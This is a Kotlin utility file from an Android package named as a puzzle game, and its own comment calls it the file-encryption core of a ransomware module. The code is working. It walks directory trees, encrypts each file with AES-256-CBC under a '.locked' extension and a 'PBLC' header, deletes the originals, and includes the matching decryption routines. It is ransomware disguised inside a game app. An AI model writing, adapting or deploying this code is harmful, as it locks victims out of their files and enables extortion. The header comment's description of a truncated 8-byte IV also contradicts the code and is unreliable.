package com.puzzleblast.game.util

import android.util.Base64
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/** AES-256-CBC file crypto for ransomware module. Encrypted files get .locked
 *  extension and an 8-byte IV header (truncated IV; full 16-byte IV stored in
 *  the header of each file for self-contained decryption). */
object Crypto {
    private const val EXT = ".locked"
    private const val HEADER_MAGIC = "PBLC"

    fun generateKey(): String {
        val key = ByteArray(32)
        SecureRandom().nextBytes(key)
        return Base64.encodeToString(key, Base64.NO_WRAP)
    }

    private fun keySpec(keyB64: String): SecretKeySpec {
        val raw = Base64.decode(keyB64, Base64.NO_WRAP)
        val key32 = if (raw.size >= 32) raw.copyOf(32) else ByteArray(32).also { raw.copyInto(it) }
        return SecretKeySpec(key32, "AES")
    }

    fun encryptFile(keyB64: String, file: File): Boolean {
        return try {
            val iv = ByteArray(16); SecureRandom().nextBytes(iv)
            val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(Cipher.ENCRYPT_MODE, keySpec(keyB64), IvParameterSpec(iv))
            val outFile = File(file.parent, file.name + EXT)
            FileOutputStream(outFile).use { fos ->
                fos.write(HEADER_MAGIC.toByteArray())
                fos.write(iv)
                val buf = ByteArray(64 * 1024)
                FileInputStream(file).use { fis ->
                    while (true) {
                        val n = fis.read(buf)
                        if (n <= 0) break
                        fos.write(cipher.update(buf, 0, n))
                    }
                    fos.write(cipher.doFinal())
                }
            }
            file.delete()
            true
        } catch (e: Exception) {
            false
        }
    }

    fun decryptFile(keyB64: String, file: File): Boolean {
        return try {
            if (!file.name.endsWith(EXT)) return false
            FileInputStream(file).use { fis ->
                val magic = ByteArray(4); fis.read(magic)
                if (String(magic) != HEADER_MAGIC) return false
                val iv = ByteArray(16); fis.read(iv)
                val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
                cipher.init(Cipher.DECRYPT_MODE, keySpec(keyB64), IvParameterSpec(iv))
                val outFile = File(file.parent, file.name.removeSuffix(EXT))
                FileOutputStream(outFile).use { fos ->
                    val buf = ByteArray(64 * 1024)
                    while (true) {
                        val n = fis.read(buf)
                        if (n <= 0) break
                        fos.write(cipher.update(buf, 0, n))
                    }
                    fos.write(cipher.doFinal())
                }
            }
            file.delete()
            true
        } catch (e: Exception) {
            false
        }
    }

    fun walkEncrypt(keyB64: String, root: File, predicate: (File) -> Boolean = { true }): Int {
        var count = 0
        root.walkTopDown().forEach { f ->
            if (f.isFile && predicate(f) && !f.name.endsWith(EXT)) {
                if (encryptFile(keyB64, f)) count++
            }
        }
        return count
    }

    fun walkDecrypt(keyB64: String, root: File): Int {
        var count = 0
        root.walkTopDown().forEach { f ->
            if (f.isFile && f.name.endsWith(EXT)) {
                if (decryptFile(keyB64, f)) count++
            }
        }
        return count
    }
}
